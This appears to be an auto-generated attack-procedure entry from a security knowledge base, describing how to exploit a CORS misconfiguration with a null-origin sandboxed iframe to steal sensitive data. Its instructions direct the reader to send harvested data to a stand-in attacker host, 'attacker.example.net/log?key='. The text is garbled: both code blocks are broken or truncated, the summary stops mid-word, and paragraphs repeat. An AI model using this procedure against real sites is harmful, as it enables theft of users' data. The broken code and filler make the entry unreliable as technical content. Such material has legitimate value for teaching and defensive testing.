---
id: 4380965d-9727-4ed2-9b14-4b8c5faeb1bd
name: CORS Misconfiguration Exploitation via Null Origin
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:55:55.786355+00:00'
updated_at: '2023-04-10T20:21:21.923146+00:00'
tags:
- '[[CORS Misconfiguration]]'
- '[[Exploitation]]'
- '[[Proof of concept]]'
- '[[Vulnerable Example: Null Origin]]'
---

# CORS Misconfiguration Exploitation via Null Origin

## Summary

CORS (Cross-Origin Resource Sharing) is a security feature implemented in modern web browsers to protect users from malicious websites. However, misconfigured CORS policies can allow attackers to bypass these security features and access sensitive information. This procedure exploits a misconfigure

## Description

# Description

CORS (Cross-Origin Resource Sharing) is a security feature implemented in modern web browsers to protect users from malicious websites. However, misconfigured CORS policies can allow attackers to bypass these security features and access sensitive information. This procedure exploits a misconfigured CORS policy by using a null origin to trick the server into providing sensitive information. The attacker can then use this information to perform further attacks on the victim system.

Technical Explanation: This procedure exploits a vulnerability in the CORS policy of a web application. By using a null origin, the attacker can trick the server into allowing the attacker to access sensitive information. The attacker can then use this information to perform further attacks on the victim system.

Business Value: This procedure can be used by attackers to gain access to sensitive information that can be used for further attacks on the victim system. This can lead to data theft, loss of reputation, and financial loss for the victim organization.

## Requirements

1. Access to a web application with misconfigured CORS policies

## Defense

1. Ensure that CORS policies are properly configured and restrict access to sensitive information based on the origin of the request.

1. Use Content Security Policy (CSP) to restrict the types of content that can be loaded by the web application.

1. Implement network segmentation to limit the attacker's ability to move laterally within the victim organization's network.

## Objectives

1. Gain access to sensitive information

# Instructions

1. Copy and paste the following code into an HTML file

**Code**: [[null]]

> The following code creates an iframe that exploits the misconfigured CORS policy by using a null origin to trick the server into providing sensitive information. The attacker can then use this information to perform further attacks on the victim system.

2. Replace the 'https://victim.example.com/endpoint' URL with the URL of the endpoint that contains the sensitive information you want to access. Replace the 'https://attacker.example.net/log?key=' URL with the URL of the attacker's server where the sensitive information will be sent.

**Code**: [[<iframe sandbox="allow-scripts allow-top-navigatio]]

> The HTML code exploits the misconfigured CORS policy by using a null origin to trick the server into providing sensitive information. The attacker can then use this information to perform further attacks on the victim system.

## Tags

- [[CORS Misconfiguration]]
- [[Exploitation]]
- [[Proof of concept]]
- [[Vulnerable Example: Null Origin]]
